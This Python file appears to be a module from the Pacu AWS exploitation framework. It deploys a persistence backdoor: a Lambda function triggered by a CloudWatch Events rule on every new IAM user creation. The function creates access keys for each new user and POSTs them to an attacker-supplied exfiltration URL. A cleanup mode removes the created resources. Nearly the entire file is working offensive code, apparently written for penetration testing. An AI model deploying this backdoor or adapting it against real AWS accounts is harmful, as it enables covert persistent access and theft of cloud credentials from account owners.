#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
from copy import deepcopy
import subprocess
import random
import string
import os


module_info = {
    'name': 'lambda__backdoor_new_users',

    'author': 'Spencer Gietzen of Rhino Security Labs based on code from Daniel Grzelak (https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_created_users_lambda/backdoor_created_users_lambda.py)',

    'category': 'PERSIST',

    'one_liner': 'Creates a Lambda function and CloudWatch Events rule to backdoor new IAM users.',

    'description': 'This module creates a new Lambda function and an accompanying CloudWatch Events rule that will trigger upon a new IAM user being created in the account. The function will automatically add a set of access keys to the user and send them to the server you supplied. The function and rule will always be created in us-east-1, as that is the only CloudWatch region that gets sent IAM events. Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.',

    'services': ['Lambda', 'Events', 'IAM'],

    'prerequisite_modules': ['iam__enum_users_roles_policies_groups'],

    'external_dependencies': [],

    'arguments_to_autocomplete': ['--exfil-url', '--cleanup'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--exfil-url', required=False, default=None, help='The URL to POST backdoor credentials to, so you can access them.')
parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known backdoors that the module added from the account.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ######
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    get_regions = pacu_main.get_regions
    fetch_data = pacu_main.fetch_data
    ######

    if args.cleanup:
        created_lambda_functions = []
        created_cwe_rules = []

        if os.path.isfile('./modules/{}/created-lambda-functions.txt'.format(module_info['name'])):
            with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'r') as f:
                created_lambda_functions = f.readlines()
        if os.path.isfile('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name'])):
            with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'r') as f:
                created_cwe_rules = f.readlines()

        if created_lambda_functions:
            delete_function_file = True
            for function in created_lambda_functions:
                name = function.rstrip()
                print('  Deleting function {}...'.format(name))
                client = pacu_main.get_boto3_client('lambda', 'us-east-1')
                try:
                    client.delete_function(
                        FunctionName=name
                    )
                except ClientError as error:
                    code = error.response['Error']['Code']
                    if code == 'AccessDeniedException':
                        print('  FAILURE: MISSING NEEDED PERMISSIONS')
                    else:
                        print(code)
                    delete_function_file = False
                    break
            if delete_function_file:
                try:
                    os.remove('./modules/{}/created-lambda-functions.txt'.format(module_info['name']))
                except Exception as error:
                    print('  Failed to remove ./modules/{}/created-lambda-functions.txt'.format(module_info['name']))

        if created_cwe_rules:
            delete_cwe_file = True
            for rule in created_cwe_rules:
                name = rule.rstrip()
                print('  Deleting rule {}...'.format(name))
                client = pacu_main.get_boto3_client('events', 'us-east-1')
                try:
                    client.remove_targets(
                        Rule=name,
                        Ids=['0']
                    )
                    client.delete_rule(
                        Name=name
                    )
                except ClientError as error:
                    code = error.response['Error']['Code']
                    if code == 'AccessDeniedException':
                        print('  FAILURE: MISSING NEEDED PERMISSIONS')
                    else:
                        print(code)
                    delete_cwe_file = False
                    break
            if delete_cwe_file:
                try:
                    os.remove('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']))
                except Exception as error:
                    print('  Failed to remove ./modules/{}/created-lambda-functions.txt'.format(module_info['name']))

        print('Completed cleanup mode.\n')
        return {'cleanup': True}

    if not args.exfil_url:
        print('  --exfil-url is required if you are not running in cleanup mode!')
        return

    data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}

    created_resources = {'LambdaFunctions': [], 'CWERules': []}

    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the IAM CreateAccessKey permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
    if not target_role_arn:
        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
            print('Pre-req module not run successfully. Exiting...')
            return False
        roles = deepcopy(session.IAM['Roles'])

        print('Found {} roles. Choose one below.'.format(len(roles)))
        for i in range(0, len(roles)):
            print('  [{}] {}'.format(i, roles[i]['RoleName']))
        choice = input('Choose an option: ')
        target_role_arn = roles[int(choice)]['Arn']

    # Import the Lambda function and modify the variables it needs
    with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
        code = f.read()

    code = code.replace('POST_URL', args.exfil_url)

    with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
        f.write(code)

    # Zip the Lambda function
    try:
        print('  Zipping the Lambda function...\n')
        subprocess.run('cd ./modules/{}/ && rm -f lambda_function.zip && zip lambda_function.zip lambda_function.py && cd ../../'.format(module_info['name']), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as error:
        print('Failed to zip the Lambda function locally: {}\n'.format(error))
        return data

    with open('./modules/{}/lambda_function.zip'.format(module_info['name']), 'rb') as f:
        zip_file_bytes = f.read()

    client = pacu_main.get_boto3_client('lambda', 'us-east-1')

    try:
        function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
        response = client.create_function(
            FunctionName=function_name,
            Runtime='python3.6',
            Role=target_role_arn,
            Handler='lambda_function.lambda_handler',
            Code={
                'ZipFile': zip_file_bytes
            }
        )
        lambda_arn = response['FunctionArn']
        print('  Created Lambda function: {}'.format(function_name))
        data['functions_created'] += 1
        created_resources['LambdaFunctions'].append(function_name)

        client = pacu_main.get_boto3_client('events', 'us-east-1')

        response = client.put_rule(
            Name=function_name,
            EventPattern='{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["iam.amazonaws.com"],"eventName":["CreateUser"]}}',
            State='ENABLED'
        )
        print('  Created CloudWatch Events rule: {}'.format(response['RuleArn']))
        data['rules_created'] += 1

        client = pacu_main.get_boto3_client('lambda', 'us-east-1')

        client.add_permission(
            FunctionName=function_name,
            StatementId=''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)),
            Action='lambda:InvokeFunction',
            Principal='events.amazonaws.com',
            SourceArn=response['RuleArn']
        )

        client = pacu_main.get_boto3_client('events', 'us-east-1')

        response = client.put_targets(
            Rule=function_name,
            Targets=[
                {
                    'Id': '0',
                    'Arn': lambda_arn
                }
            ]
        )
        if response['FailedEntryCount'] > 0:
            print('Failed to add the Lambda function as a target to the CloudWatch rule. Failed entries:')
            print(response['FailedEntries'])
        else:
            print('  Added Lambda target to CloudWatch Events rule.')
            data['successes'] += 1
            created_resources['CWERules'].append(function_name)
    except ClientError as error:
        code = error.response['Error']['Code']
        if code == 'AccessDeniedException':
            print('  FAILURE: MISSING NEEDED PERMISSIONS')
        else:
            print(code)

    if created_resources['LambdaFunctions']:
        with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'w+') as f:
            f.write('\n'.join(created_resources['LambdaFunctions']))
    if created_resources['CWERules']:
        with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'w+') as f:
            f.write('\n'.join(created_resources['CWERules']))

    print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.')

    return data


def summary(data, pacu_main):
    if data.get('cleanup'):
        return '  Completed cleanup of Lambda functions and CloudWatch Events rules.'

    return '  Lambda functions created: {}\n  CloudWatch Events rules created: {}\n  Successful backdoor deployments: {}\n'.format(data['functions_created'], data['rules_created'], data['successes'])